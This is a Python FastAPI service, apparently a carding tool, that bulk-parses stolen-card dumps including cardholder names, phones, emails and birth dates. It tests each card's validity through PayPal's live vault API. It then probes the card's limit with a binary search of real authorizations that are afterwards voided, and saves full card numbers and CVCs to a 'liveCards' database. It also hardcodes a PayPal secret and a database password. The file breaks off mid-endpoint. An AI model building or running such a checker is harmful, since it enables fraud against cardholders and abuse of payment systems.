"""
PAYPAL CARD CHECKER API - FASTAPI VERSION v11.0.0
- Live Check + Balance Check (Binary Search) + Bin Check
- PayPal Vault Setup + Confirm
- Tüm formatlar desteklenir
- liveCards MongoDB koleksiyonuna kaydeder
Swagger Docs: /docs
"""
import os
import re
import json
import uuid
import logging
import requests
import time
from typing import Dict, List, Optional, Union, Any, Tuple
from datetime import datetime, timedelta
from dataclasses import dataclass, field
from fastapi import FastAPI, HTTPException, UploadFile, File
from fastapi.responses import JSONResponse
from pydantic import BaseModel, Field, validator
from pymongo import MongoClient
from pymongo.errors import ConnectionFailure
import uvicorn
import base64

# ==================== LOGGING ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(name)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

# ==================== PYDANTIC MODELS ====================

class CardRequest(BaseModel):
    number: str = Field(..., example="5549601721207035")
    exp_month: str = Field(..., example="08")
    exp_year: str = Field(..., example="2026")
    cvc: str = Field(..., example="319")
    name: Optional[str] = "Test User"
    country: Optional[str] = "TR"
    zip: Optional[str] = "00000"
    email: Optional[str] = None
    phone: Optional[str] = None
    dob: Optional[str] = None
    ip: Optional[str] = None
    user_agent: Optional[str] = None

    @validator('exp_month')
    def validate_exp_month(cls, v):
        v = str(v).strip()
        if len(v) == 1:
            v = f"0{v}"
        return v

    @validator('exp_year')
    def validate_exp_year(cls, v):
        v = str(v).strip()
        if len(v) == 2:
            v = f"20{v}"
        return v

    @validator('number')
    def validate_number(cls, v):
        v = re.sub(r'[^0-9]', '', str(v))
        if len(v) < 15 or len(v) > 16:
            raise ValueError(f"Geçersiz kart numarası uzunluğu: {len(v)}")
        return v

    @validator('cvc')
    def validate_cvc(cls, v):
        v = re.sub(r'[^0-9]', '', str(v))
        if len(v) < 3 or len(v) > 4:
            raise ValueError(f"Geçersiz CVC uzunluğu: {len(v)}")
        return v

class BatchCardRequest(BaseModel):
    cards: List[CardRequest] = Field(..., min_items=1, max_items=50)

class ParseRequest(BaseModel):
    data: Union[str, List, Dict] = Field(...)

# ==================== KONFIGÜRASYON ====================
CONFIG = {
    'paypal_client_id': 'AexXX36fYkQu_BFsmXISn-6ZRZaU6_Lm-q2BmsCLPLqiz3zt7lhKxc3x13UTWXADXkonA8wbeNKY0ZDW',
    'paypal_client_secret': 'EDdrMKnpxsjdk_MaGcAbTUP_boVPh8jx0w1HNu8c18nbC2j8nL0b1FFYjH0eJSFcPyewmDQv6T0as9n5',
    'paypal_api_base': 'https://api-m.paypal.com',
    'mongo_uri': 'mongodb+srv://cardmarketApp:gnbqHdTrlceMZjOS@paymentmanger.gvaavzc.mongodb.net/mydb?retryWrites=true&w=majority',
    'mongo_database': 'mydb',
    'mongo_collection': 'card_checks',
    'mongo_bin_collection': 'binList',
    'mongo_live_cards_collection': 'liveCards'
}

app = FastAPI(
    title="PayPal Card Checker API",
    description="Live Check + Balance Check (Binary Search) + Bin Check",
    version="11.0.0",
    docs_url="/docs",
    redoc_url="/redoc"
)

# ==================== MONGODB ====================

class MongoDB:
    _instance = None

    def __new__(cls):
        if cls._instance is None:
            cls._instance = super(MongoDB, cls).__new__(cls)
            cls._instance._initialize()
        return cls._instance

    def _initialize(self):
        try:
            self.client = MongoClient(CONFIG['mongo_uri'])
            self.client.admin.command('ping')
            self.db = self.client[CONFIG['mongo_database']]
            self.collection = self.db[CONFIG['mongo_collection']]
            self.bin_collection = self.db[CONFIG['mongo_bin_collection']]
            self.live_cards_collection = self.db[CONFIG['mongo_live_cards_collection']]

            self.collection.create_index('check_id', unique=True)
            self.collection.create_index('created_at')
            self.collection.create_index('card_last4')
            self.collection.create_index('status')
            self.collection.create_index('setup_token')
            self.collection.create_index('payment_token')
            self.bin_collection.create_index('BIN', unique=True)
            self.live_cards_collection.create_index('card_number', unique=True)
            self.live_cards_collection.create_index('card_last4')
            self.live_cards_collection.create_index('created_at')

            logger.info('✅ MongoDB bağlantısı başarılı')
        except ConnectionFailure as e:
            logger.error(f'❌ MongoDB bağlantı hatası: {str(e)}')
            raise
        except Exception as e:
            logger.error(f'❌ MongoDB başlatma hatası: {str(e)}')
            raise

    def get_bin_info(self, card_number: str) -> Optional[Dict]:
        try:
            for bin_prefix in [card_number[:6], card_number[:5], card_number[:4]]:
                result = self.bin_collection.find_one({'BIN': bin_prefix})
                if result:
                    if '_id' in result:
                        result['_id'] = str(result['_id'])
                    return {
                        'bin': result.get('BIN'),
                        'brand': result.get('Brand', 'UNKNOWN'),
                        'type': result.get('Type', 'UNKNOWN'),
                        'level': result.get('Category', 'STANDARD'),
                        'bank': result.get('Issuer', 'Unknown'),
                        'country': result.get('isoCode2', 'XX'),
                        'country_name': result.get('CountryName', 'Unknown'),
                        'issuer_phone': result.get('IssuerPhone', ''),
                        'issuer_url': result.get('IssuerUrl', ''),
                        'raw': result
                    }
            return None
        except Exception as e:
            logger.error(f'❌ BIN sorgulama hatası: {str(e)}')
            return None

    def insert_record(self, data: Dict) -> str:
        try:
            if 'created_at' not in data:
                data['created_at'] = datetime.now().isoformat()
            if 'updated_at' not in data:
                data['updated_at'] = datetime.now().isoformat()
            result = self.collection.insert_one(data)
            logger.info(f'✅ Kayıt eklendi: {data.get("check_id")}')
            return str(result.inserted_id)
        except Exception as e:
            logger.error(f'❌ Kayıt ekleme hatası: {str(e)}')
            raise

    def insert_live_card(self, data: Dict) -> str:
        try:
            if 'created_at' not in data:
                data['created_at'] = datetime.now().isoformat()
            if 'updated_at' not in data:
                data['updated_at'] = datetime.now().isoformat()
            # Güncelleme yap (aynı kart varsa güncelle)
            result = self.live_cards_collection.update_one(
                {'card_number': data['card_number']},
                {'$set': data},
                upsert=True
            )
            logger.info(f'✅ LiveCard kaydedildi: {data.get("card_number")}')
            return str(result.upserted_id) if result.upserted_id else str(result)
        except Exception as e:
            logger.error(f'❌ LiveCard kayıt hatası: {str(e)}')
            raise

    def get_record(self, check_id: str) -> Optional[Dict]:
        try:
            result = self.collection.find_one({'check_id': check_id})
            if result and '_id' in result:
                result['_id'] = str(result['_id'])
            return result
        except Exception as e:
            logger.error(f'❌ Kayıt getirme hatası: {str(e)}')
            raise

    def get_stats(self) -> Dict:
        try:
            total = self.collection.count_documents({})
            verified = self.collection.count_documents({'status': 'VERIFIED'})
            failed = self.collection.count_documents({'status': 'AUTH_FAILED'})
            today = datetime.now().date().isoformat()
            today_count = self.collection.count_documents({
                'created_at': {'$regex': f'^{today}'}
            })
            live_cards_count = self.live_cards_collection.count_documents({})
            recent = list(self.collection.find().sort('created_at', -1).limit(10))
            for r in recent:
                if '_id' in r:
                    r['_id'] = str(r['_id'])
            return {
                'total_checks': total,
                'verified': verified,
                'failed': failed,
                'today': today_count,
                'live_cards_count': live_cards_count,
                'recent': recent
            }
        except Exception as e:
            logger.error(f'❌ İstatistik hatası: {str(e)}')
            return {'error': str(e)}

try:
    mongo_db = MongoDB()
except Exception as e:
    logger.error(f'❌ MongoDB başlatılamadı: {str(e)}')
    mongo_db = None

# ==================== PARSER ====================

@dataclass
class CardData:
    number: str
    exp_month: str
    exp_year: str
    cvc: str
    name: str = "Test User"
    country: str = "TR"
    zip: str = "00000"
    email: Optional[str] = None
    phone: Optional[str] = None
    dob: Optional[str] = None
    ip: Optional[str] = None
    user_agent: Optional[str] = None
    metadata: Dict[str, Any] = field(default_factory=dict)

    def get_masked(self) -> str:
        return f"{self.number[:4]}****{self.number[-4:]}"

    def get_bin(self) -> str:
        return self.number[:6]

class CardParser:
    @staticmethod
    def parse(data: Union[str, List, Dict]) -> List[CardData]:
        if isinstance(data, (list, dict)):
            return CardParser._parse_json(data)
        if isinstance(data, str):
            data = data.strip()
            if not data:
                return []

            if data.startswith('[') or data.startswith('{'):
                try:
                    json_data = json.loads(data)
                    return CardParser._parse_json(json_data)
                except:
                    pass

            if '|' in data and len(data.split('|')) > 10:
                return CardParser._parse_full_pipe(data)

            if '|' in data:
                return CardParser._parse_pipe(data)

            if ',' in data and '\n' in data:
                return CardParser._parse_csv(data)

            if ' ' in data and '\n' in data:
                return CardParser._parse_space(data)

        return []

    @staticmethod
    def _parse_pipe(data: str) -> List[CardData]:
        cards = []
        for line in data.strip().split('\n'):
            line = line.strip()
            if not line:
                continue
            parts = line.split('|')
            if len(parts) >= 3:
                number = parts[0].strip()
                exp_part = parts[1].strip()
                cvc = parts[2].strip()
                exp_month, exp_year = CardParser._parse_expiration(exp_part)
                if number and exp_month and exp_year and cvc:
                    cards.append(CardData(
                        number=number,
                        exp_month=exp_month,
                        exp_year=exp_year,
                        cvc=cvc
                    ))
        return cards

    @staticmethod
    def _parse_full_pipe(data: str) -> List[CardData]:
        cards = []
        for line in data.strip().split('\n'):
            line = line.strip()
            if not line:
                continue
            parts = line.split('|')
            if len(parts) < 3:
                continue

            number = parts[0].strip() if parts[0] else None
            exp_part = parts[1].strip() if len(parts) > 1 else None
            cvc = parts[2].strip() if len(parts) > 2 else None
            name = parts[3].strip() if len(parts) > 3 and parts[3] else "Test User"

            phone = None
            if len(parts) > 10 and parts[10].strip():
                phone = parts[10].strip()
            elif len(parts) > 9 and parts[9].strip():
                phone = parts[9].strip()

            email = None
            if len(parts) > 11 and parts[11].strip():
                email = parts[11].strip()
            elif len(parts) > 10 and parts[10].strip() and "@" in parts[10]:
                email = parts[10].strip()

            dob = None
            if len(parts) > 12 and parts[12].strip() and parts[12].strip() != "--":
                dob = parts[12].strip()
            elif len(parts) > 11 and parts[11].strip() and parts[11].strip() != "--":
                dob = parts[11].strip()

            ip = None
            if len(parts) > 13 and parts[13].strip():
                ip = parts[13].strip()
            elif len(parts) > 12 and parts[12].strip():
                ip = parts[12].strip()

            user_agent = None
            if len(parts) > 14 and parts[14].strip():
                user_agent = parts[14].strip()
            elif len(parts) > 13 and parts[13].strip():
                user_agent = parts[13].strip()

            if number and exp_part and cvc:
                exp_month, exp_year = CardParser._parse_expiration(exp_part)
                if exp_month and exp_year:
                    cards.append(CardData(
                        number=number,
                        exp_month=exp_month,
                        exp_year=exp_year,
                        cvc=cvc,
                        name=name,
                        email=email,
                        phone=phone,
                        dob=dob,
                        ip=ip,
                        user_agent=user_agent
                    ))
        return cards

    @staticmethod
    def _parse_csv(data: str) -> List[CardData]:
        cards = []
        lines = data.strip().split('\n')
        if not lines:
            return cards
        header = lines[0].lower() if lines else ""
        has_header = 'card' in header or 'number' in header or 'cc' in header
        start_idx = 1 if has_header else 0
        for line in lines[start_idx:]:
            line = line.strip()
            if not line:
                continue
            parts = line.split(',')
            if len(parts) >= 3:
                number = parts[0].strip()
                exp_part = parts[1].strip()
                cvc = parts[2].strip()
                exp_month, exp_year = CardParser._parse_expiration(exp_part)
                if number and exp_month and exp_year and cvc:
                    cards.append(CardData(
                        number=number,
                        exp_month=exp_month,
                        exp_year=exp_year,
                        cvc=cvc
                    ))
        return cards

    @staticmethod
    def _parse_space(data: str) -> List[CardData]:
        cards = []
        for line in data.strip().split('\n'):
            line = line.strip()
            if not line:
                continue
            parts = line.split()
            if len(parts) >= 3:
                number = parts[0].strip()
                exp_part = parts[1].strip()
                cvc = parts[2].strip()
                exp_month, exp_year = CardParser._parse_expiration(exp_part)
                if number and exp_month and exp_year and cvc:
                    cards.append(CardData(
                        number=number,
                        exp_month=exp_month,
                        exp_year=exp_year,
                        cvc=cvc
                    ))
        return cards

    @staticmethod
    def _parse_json(data: Union[List, Dict]) -> List[CardData]:
        cards = []
        if not isinstance(data, list):
            data = [data]
        for item in data:
            card_data = CardParser._extract_from_json_item(item)
            if card_data:
                cards.append(card_data)
        return cards

    @staticmethod
    def _parse_expiration(exp_str: str) -> Tuple[Optional[str], Optional[str]]:
        exp_str = exp_str.strip()
        for sep in ['/', '-', '|', ' ', '.']:
            if sep in exp_str:
                parts = exp_str.split(sep)
                if len(parts) == 2:
                    month = parts[0].strip()
                    year = parts[1].strip()
                    if len(month) == 1:
                        month = f"0{month}"
                    if len(year) == 2:
                        year = f"20{year}"
                    elif len(year) == 4:
                        year = year
                    if month.isdigit() and year.isdigit():
                        return month, year
        if exp_str.isdigit():
            if len(exp_str) == 4:
                return exp_str[:2], f"20{exp_str[2:]}"
            elif len(exp_str) == 6:
                return exp_str[:2], exp_str[2:]
        return None, None

    @staticmethod
    def _extract_from_json_item(item: Dict) -> Optional[CardData]:
        if 'number' in item:
            number = item.get('number')
            exp_month = item.get('exp_month') or item.get('month')
            exp_year = item.get('exp_year') or item.get('year')
            cvc = item.get('cvc') or item.get('cvv') or item.get('CVV')
            if number and exp_month and exp_year and cvc:
                return CardData(
                    number=str(number),
                    exp_month=str(exp_month),
                    exp_year=str(exp_year),
                    cvc=str(cvc)
                )
        if 'CreditCard' in item:
            cc = item['CreditCard']
            number = cc.get('CardNumber') or cc.get('number')
            exp = cc.get('Exp') or cc.get('exp') or cc.get('expiration')
            cvc = cc.get('CVV') or cc.get('cvv') or cc.get('cvc')
            if number and exp and cvc:
                exp_month, exp_year = CardParser._parse_expiration(str(exp))
                if exp_month and exp_year:
                    return CardData(
                        number=str(number),
                        exp_month=exp_month,
                        exp_year=exp_year,
                        cvc=str(cvc)
                    )
        if 'CardInfo' in item:
            ci = item['CardInfo']
            number = ci.get('CardNumber') or ci.get('number')
            exp = ci.get('Expiration') or ci.get('exp')
            cvc = ci.get('CVV') or ci.get('cvc')
            if number and exp and cvc:
                exp_month, exp_year = CardParser._parse_expiration(str(exp))
                if exp_month and exp_year:
                    return CardData(
                        number=str(number),
                        exp_month=exp_month,
                        exp_year=exp_year,
                        cvc=str(cvc)
                    )
        return None

# ==================== YARDIMCI FONKSİYONLAR ====================

def detect_card_brand(card_number: str) -> str:
    patterns = {
        'VISA': r'^4',
        'MASTERCARD': r'^(5[1-5]|2[2-7])',
        'AMEX': r'^(34|37)',
        'DISCOVER': r'^(6011|65|64[4-9]|622)',
        'JCB': r'^35',
        'DINERS': r'^3(0[0-5]|[68])'
    }
    for brand, pattern in patterns.items():
        if re.match(pattern, card_number):
            return brand
    return 'UNKNOWN'

# ==================== PAYPAL PROCESSOR (Balance Check Eklendi) ====================

class PayPalProcessor:
    def __init__(self):
        self.client_id = CONFIG['paypal_client_id']
        self.client_secret = CONFIG['paypal_client_secret']
        self.api_base = CONFIG['paypal_api_base']
        self.access_token = None
        self.token_expiry = None

    def _get_access_token(self) -> str:
        try:
            if self.access_token and self.token_expiry:
                if datetime.now() < self.token_expiry:
                    return self.access_token
            auth = base64.b64encode(f"{self.client_id}:{self.client_secret}".encode()).decode()
            headers = {
                "Authorization": f"Basic {auth}",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            data = {"grant_type": "client_credentials"}
            response = requests.post(
                f"{self.api_base}/v1/oauth2/token",
                headers=headers,
                data=data,
                timeout=30
            )
            if response.status_code == 200:
                result = response.json()
                self.access_token = result.get("access_token")
                expires_in = result.get("expires_in", 3600)
                self.token_expiry = datetime.now() + timedelta(seconds=expires_in - 60)
                logger.info("✅ PayPal Access Token alındı")
                return self.access_token
            else:
                logger.error(f"❌ Access Token hatası: {response.text}")
                raise Exception(f"PayPal auth failed: {response.text}")
        except Exception as e:
            logger.error(f"❌ Token exception: {str(e)}")
            raise

    def _create_setup_token(self, card: CardData, bin_info: Dict = None, amount: float = 0.0) -> Tuple[bool, Optional[str], Optional[Dict]]:
        """Setup Token oluştur (amount artık desteklenmiyor, 0$ olarak gönder)"""
        try:
            setup_url = f"{self.api_base}/v3/vault/setup-tokens"
            country_code = bin_info.get('country', 'US') if bin_info else 'US'
            zip_code = "00000"

            raw_name = card.name.strip() if card.name else "Test User"
            clean_name = re.sub(r'[^a-zA-ZğüşıöçĞÜŞİÖÇ\s-]', '', raw_name)
            if not clean_name or clean_name.strip() == "":
                clean_name = "Test User"
            clean_name = re.sub(r'\s+', ' ', clean_name).strip()
            if len(clean_name) > 32:
                clean_name = clean_name[:32]

            expiry = f"{card.exp_year}-{card.exp_month}"
            number = re.sub(r'[^0-9]', '', card.number)
            cvc = re.sub(r'[^0-9]', '', card.cvc)

            payload = {
                "payment_source": {
                    "card": {
                        "number": number,
                        "expiry": expiry,
                        "security_code": cvc,
                        "name": clean_name,
                        "billing_address": {
                            "address_line_1": "123 Main St",
                            "admin_area_2": "Istanbul",
                            "postal_code": zip_code,
                            "country_code": country_code
                        }
                    }
                }
            }
            if not clean_name or clean_name == "":
                del payload["payment_source"]["card"]["name"]

            payload_json = json.dumps(payload, ensure_ascii=False)
            headers = {
                "Authorization": f"Bearer {self.access_token}",
                "Content-Type": "application/json",
                "Accept": "application/json",
                "PayPal-Request-Id": str(uuid.uuid4()),
                "Prefer": "return=representation"
            }

            response = requests.post(setup_url, data=payload_json, headers=headers, timeout=60)
            if response.status_code in [200, 201]:
                result = response.json()
                setup_token = result.get("id")
                logger.info(f"✅ Setup Token oluşturuldu: {setup_token}")
                return True, setup_token, result
            else:
                error_text = response.text
                logger.error(f"❌ Setup Token hatası: {error_text}")
                return False, None, None
        except Exception as e:
            logger.error(f"❌ Setup Token exception: {str(e)}")
            return False, None, None

    def _confirm_setup_token(self, setup_token: str) -> Tuple[bool, Optional[str], Optional[str], Optional[Dict]]:
        try:
            confirm_url = f"{self.api_base}/v3/vault/payment-tokens"
            headers = {
                "Authorization": f"Bearer {self.access_token}",
                "Content-Type": "application/json",
                "Accept": "application/json",
                "PayPal-Request-Id": str(uuid.uuid4()),
                "Prefer": "return=representation"
            }
            payload = {"setup_token": {"id": setup_token}}
            response = requests.post(confirm_url, json=payload, headers=headers, timeout=30)
            if response.status_code in [200, 201]:
                result = response.json()
                payment_token = result.get("id")
                logger.info(f"✅ Payment Token oluşturuldu: {payment_token}")
                return True, payment_token, None, result
            else:
                error_text = response.text
                logger.error(f"❌ Payment Token confirm hatası: {error_text}")
                return False, None, error_text, None
        except Exception as e:
            logger.error(f"❌ Confirm exception: {str(e)}")
            return False, None, str(e), None

    def _void_authorization(self, auth_id: str) -> bool:
        """Ön yetkilendirmeyi iptal et (void)"""
        try:
            void_url = f"{self.api_base}/v2/payments/authorizations/{auth_id}/void"
            headers = {
                "Authorization": f"Bearer {self.access_token}",
                "Content-Type": "application/json",
                "Accept": "application/json"
            }
            response = requests.post(void_url, headers=headers, timeout=30)
            if response.status_code in [200, 201, 202, 204]:
                logger.info(f"✅ Auth iptal edildi: {auth_id}")
                return True
            else:
                logger.warning(f"⚠️ Auth iptal başarısız: {response.text}")
                return False
        except Exception as e:
            logger.error(f"❌ Void exception: {str(e)}")
            return False

    def _create_order_with_setup_token(self, setup_token: str, amount: float, currency: str = "USD") -> Tuple[bool, Optional[str], Optional[Dict]]:
        """
        Setup token ile order oluştur ve authorize et.
        PayPal Vault ile doğrudan amount belirtilemediğinden, bu işlem için PayPal Orders API kullanılır.
        """
        try:
            order_url = f"{self.api_base}/v2/checkout/orders"
            headers = {
                "Authorization": f"Bearer {self.access_token}",
                "Content-Type": "application/json",
                "Accept": "application/json",
                "PayPal-Request-Id": str(uuid.uuid4())
            }
            payload = {
                "intent": "AUTHORIZE",
                "purchase_units": [
                    {
                        "amount": {
                            "currency_code": currency,
                            "value": f"{amount:.2f}"
                        },
                        "payment_source": {
                            "card": {
                                "vault_id": setup_token
                            }
                        }
                    }
                ]
            }
            response = requests.post(order_url, json=payload, headers=headers, timeout=30)
            if response.status_code in [200, 201]:
                result = response.json()
                order_id = result.get('id')
                status = result.get('status')
                logger.info(f"✅ Order oluşturuldu: {order_id} (Status: {status})")
                return True, order_id, result
            else:
                logger.error(f"❌ Order oluşturma hatası: {response.text}")
                return False, None, None
        except Exception as e:
            logger.error(f"❌ Order exception: {str(e)}")
            return False, None, None

    def _authorize_order(self, order_id: str) -> Tuple[bool, Optional[str], Optional[Dict]]:
        """Order'ı authorize et"""
        try:
            auth_url = f"{self.api_base}/v2/checkout/orders/{order_id}/authorize"
            headers = {
                "Authorization": f"Bearer {self.access_token}",
                "Content-Type": "application/json",
                "Accept": "application/json"
            }
            response = requests.post(auth_url, headers=headers, timeout=30)
            if response.status_code in [200, 201]:
                result = response.json()
                auth_id = result.get('id') or result.get('purchase_units', [{}])[0].get('payments', {}).get('authorizations', [{}])[0].get('id')
                logger.info(f"✅ Order authorize edildi: {order_id}")
                return True, auth_id, result
            else:
                logger.error(f"❌ Authorize hatası: {response.text}")
                return False, None, None
        except Exception as e:
            logger.error(f"❌ Authorize exception: {str(e)}")
            return False, None, None

    def _check_balance_with_binary_search(self, card: CardData, bin_info: Dict) -> Tuple[float, int]:
        """
        Binary search ile kart limitini/balance'ını bulur.
        Başlangıç: 1000$ ile dene, onay gelirse 2 katına çık, red gelirse binary search yap.
        Fark 100$ altına indiğinde dur.
        """
        if not self.access_token:
            self._get_access_token()

        # Önce setup token oluştur
        success, setup_token, _ = self._create_setup_token(card, bin_info, 0.0)
        if not success or not setup_token:
            logger.error("❌ Setup token oluşturulamadı, balance check iptal")
            return 0.0, 0

        # Order oluştur ve authorize et
        low = 0.0
        high = 0.0
        amount = 1000.0  # Başlangıç miktarı
        step = 1000.0
        auth_id = None
        attempt_count = 0
        last_approved_amount = 0.0

        while step > 100.0:
            attempt_count += 1
            logger.info(f"🔄 Balance deneme #{attempt_count}: {amount:.2f}$")

            # Order oluştur
            order_success, order_id, order_data = self._create_order_with_setup_token(setup_token, amount)
            if not order_success or not order_id:
                logger.warning(f"⚠️ Order oluşturulamadı, amount: {amount:.2f}$")
                # Order oluşturulamazsa red olarak kabul et
                high = amount
                amount = low + (high - low) / 2
                step = high - low
                continue

            # Order'ı authorize et
            auth_success, new_auth_id, auth_data = self._authorize_order(order_id)
            if auth_success:
                # Onay geldi
                logger.info(f"✅ {amount:.2f}$ onaylandı")
                low = amount
                last_approved_amount = amount
                # Önceki auth'ı iptal et (varsa)
                if auth_id:
                    self._void_authorization(auth_id)
                auth_id = new_auth_id
                # Yeni amount = current + step
                amount = low + step
                step = step * 2 if step > 0 else 1000.0
            else:
                # Red geldi
                logger.warning(f"❌ {amount:.2f}$ reddedildi")
                high = amount
                step = high - low
                amount = low + (high - low) / 2

            time.sleep(2)  # 2 saniye bekle

        # Son onaylanan amount'u iptal et
        if auth_id:
            self._void_authorization(auth_id)

        # Sonuç: low (onaylanan son miktar) veya last_approved_amount
        final_balance = max(low, last_approved_amount)
        logger.info(f"🎯 Final balance: {final_balance:.2f}$ (Attempts: {attempt_count})")
        return final_balance, attempt_count

    def process_card(self, card: CardData) -> Dict:
        check_id = str(uuid.uuid4())
        try:
            # 1. BIN bilgisini al
            bin_info = None
            if mongo_db:
                raw_bin = mongo_db.get_bin_info(card.number)
                if raw_bin:
                    bin_info = {
                        'brand': raw_bin.get('brand', 'UNKNOWN'),
                        'type': raw_bin.get('type', 'UNKNOWN'),
                        'level': raw_bin.get('level', 'STANDARD'),
                        'bank': raw_bin.get('bank', 'Unknown'),
                        'country': raw_bin.get('country', 'XX'),
                        'country_name': raw_bin.get('country_name', 'Unknown'),
                        'issuer_phone': raw_bin.get('issuer_phone', ''),
                        'issuer_url': raw_bin.get('issuer_url', ''),
                        'raw': raw_bin.get('raw', {})
                    }
                    logger.info(f"✅ BIN bilgisi bulundu: {bin_info}")
                else:
                    bin_info = {
                        'brand': detect_card_brand(card.number),
                        'type': 'UNKNOWN',
                        'level': 'STANDARD',
                        'bank': 'Unknown',
                        'country': 'XX',
                        'country_name': 'Unknown',
                        'issuer_phone': '',
                        'issuer_url': '',
                        'raw': {}
                    }
                    logger.info(f"⚠️ BIN bulunamadı, fallback kullanılıyor")
            else:
                bin_info = {
                    'brand': detect_card_brand(card.number),
                    'type': 'UNKNOWN',
                    'level': 'STANDARD',
                    'bank': 'Unknown',
                    'country': 'XX',
                    'country_name': 'Unknown',
                    'issuer_phone': '',
                    'issuer_url': '',
                    'raw': {}
                }

            # 2. Live Check (Setup + Confirm)
            success, setup_token, payment_token, error, raw_response = self.verify_card(card, bin_info)

            if not success or not setup_token:
                return {
                    'success': False,
                    'status': 'AUTH_FAILED',
                    'message': 'Kart doğrulanamadı (Live Check başarısız)',
                    'error': error,
                    'bin_info': bin_info,
                    'check_id': check_id,
                    'setup_token': None,
                    'payment_token': None,
                    'card_number': card.number,
                    'card_exp_month': card.exp_month,
                    'card_exp_year': card.exp_year,
                    'card_cvc': card.cvc
                }

            # 3. Balance Check (Binary Search)
            logger.info(f"🔍 Balance Check başlıyor: {card.get_masked()}")
            balance, attempts = self._check_balance_with_binary_search(card, bin_info)

            # 4. MongoDB'ye kaydet (liveCards)
            if mongo_db:
                live_card_data = {
                    'card_number': card.number,
                    'card_last4': card.number[-4:],
                    'exp_month': card.exp_month,
                    'exp_year': card.exp_year,
                    'cvc': card.cvc,
                    'card_brand': bin_info.get('brand'),
                    'card_type': bin_info.get('type'),
                    'card_level': bin_info.get('level'),
                    'card_issuer': bin_info.get('bank'),
                    'card_country_code': bin_info.get('country'),
                    'card_country_name': bin_info.get('country_name'),
                    'bin_prefix': card.number[:6],
                    'setup_token': setup_token,
                    'payment_token': payment_token,
                    'balance': balance,
                    'balance_attempts': attempts,
                    'status': 'VERIFIED',
                    'is_live': True,
                    'created_at': datetime.now().isoformat(),
                    'updated_at': datetime.now().isoformat()
                }
                mongo_db.insert_live_card(live_card_data)

            # 5. Response oluştur
            return {
                'success': True,
                'status': 'VERIFIED',
                'message': 'Kart doğrulandı (Live + Balance Check)',
                'setup_token': setup_token,
                'payment_token': payment_token,
                'bin_info': bin_info,
                'check_id': check_id,
                'card_number': card.number,
                'card_exp_month': card.exp_month,
                'card_exp_year': card.exp_year,
                'card_cvc': card.cvc,
                'card_brand': bin_info.get('brand'),
                'card_last4': card.number[-4:],
                'balance': balance,
                'balance_attempts': attempts,
                'currency': 'USD'
            }

        except Exception as e:
            logger.error(f'❌ İşlem hatası: {str(e)}')
            return {
                'success': False,
                'status': 'ERROR',
                'message': 'İşlem hatası',
                'error': str(e),
                'check_id': check_id,
                'setup_token': None,
                'payment_token': None,
                'card_number': card.number,
                'card_exp_month': card.exp_month,
                'card_exp_year': card.exp_year,
                'card_cvc': card.cvc
            }

    def verify_card(self, card: CardData, bin_info: Dict = None) -> Tuple[bool, Optional[str], Optional[str], Optional[str], Optional[Dict]]:
        """Live Check: Setup + Confirm"""
        try:
            if not self.access_token:
                self._get_access_token()

            # Setup Token oluştur
            success, setup_token, setup_result = self._create_setup_token(card, bin_info)
            if not success or not setup_token:
                return False, None, None, "Setup Token oluşturulamadı", None

            # Confirm dene, başarısız olsa bile kart live
            confirm_success, payment_token, confirm_error, confirm_raw = self._confirm_setup_token(setup_token)
            if confirm_success:
                logger.info(f"✅ Payment Token alındı: {payment_token}")
                return True, setup_token, payment_token, None, setup_result
            else:
                logger.warning(f"⚠️ Confirm başarısız: {confirm_error} - Kart yine de live (Setup Token geçerli)")
                return True, setup_token, None, f"Confirm failed: {confirm_error}", setup_result

        except Exception as e:
            logger.error(f"❌ Verify exception: {str(e)}")
            return False, None, None, str(e), None

# ==================== API ENDPOINT'LER ====================

@app.get("/", tags=["Root"])
async def root():
    return {
        "message": "PayPal Card Checker API (Live + Balance + Bin Check)",
        "docs": "/docs",
        "redoc": "/redoc",
        "health": "/health",
        "version": "11.0.0"
    }

@app.get("/health", tags=["Health"])
async def health_check():
    mongo_status = 'connected' if mongo_db else 'disconnected'
    return {
        "status": "healthy",
        "timestamp": datetime.now().isoformat(),
        "service": "PayPal Card Check API",
        "version": "11.0.0",
        "environment": "LIVE",
        "mongodb": mongo_status,
        "paypal": {
            "api_base": CONFIG['paypal_api_base'],
            "client_id": CONFIG['paypal_client_id'][:10] + "..."
        },
        "endpoints": [
            "POST /api/v1/check - Tek kart doğrulama (Live + Balance + Bin)",
            "POST /api/v1/check/batch - Toplu JSON doğrulama",
            "POST /api/v1/check/file - Dosya yükleme ile toplu doğrulama",
            "POST /api/v1/parse - Sadece parse test",
            "GET /api/v1/bin/{card} - BIN kontrolü",
            "GET /api/v1/check/{id} - Kayıt sorgula",
            "GET /api/v1/stats - İstatistikler",
            "GET /health - Sağlık kontrolü"
        ]
    }

@app.post("/api/v1/check", tags=["Card Operations"])
async def check_card(card_request: CardRequest):
    try:
        card = CardData(
            number=card_request.number,
            exp_month=card_request.exp_month,
            exp_year=card_request.exp_year,
            cvc=card_request.cvc,
            name=card_request.name or "Test User",
            country=card_request.country or "TR",
            zip=card_request.zip or "00000",
            email=card_request.email,
            phone=card_request.phone,
            dob=card_request.dob,
            ip=card_request.ip,
            user_agent=card_request.user_agent
        )
        processor = PayPalProcessor()
        result = processor.process_card(card)
        return {
            "success": result.get('success', False),
            "status": result.get('status', 'UNKNOWN'),
            "message": result.get('message', ''),
            "error": result.get('error'),
            "data": result
        }
    except Exception as e:
        logger.error(f'❌ API hatası: {str(e)}')
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/v1/check/batch", tags=["Card Operations"])
async def check_cards_batch(batch_request: BatchCardRequest):
    try:
        processor = PayPalProcessor()
        results = []
        for card_request in batch_request.cards:
            card = CardData(
                number=card_request.number,
                exp_month=card_request.exp_month,
                exp_year=card_request.exp_year,
                cvc=card_request.cvc,
                name=card_request.name or "Test User",
                country=card_request.country or "TR",
                zip=card_request.zip or "00000",
                email=card_request.email,
                phone=card_request.phone,
                dob=card_request.dob,
                ip=card_request.ip,
                user_agent=card_request.user_agent
            )
            result = processor.process_card(card)
            results.append(result)
        return {
            "success": True,
            "total": len(results),
            "results": results
        }
    except Exception as e:
        logger.error(f'❌ Batch API hatası: {str(e)}')
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/v1/check/file", tags=["Card Operations"])
async def check_file(file: UploadFile = File(...)):
    try:
        content = await file.read()
        text = content.decode('utf-8')
        cards = CardParser.parse(text)
        if not cards:
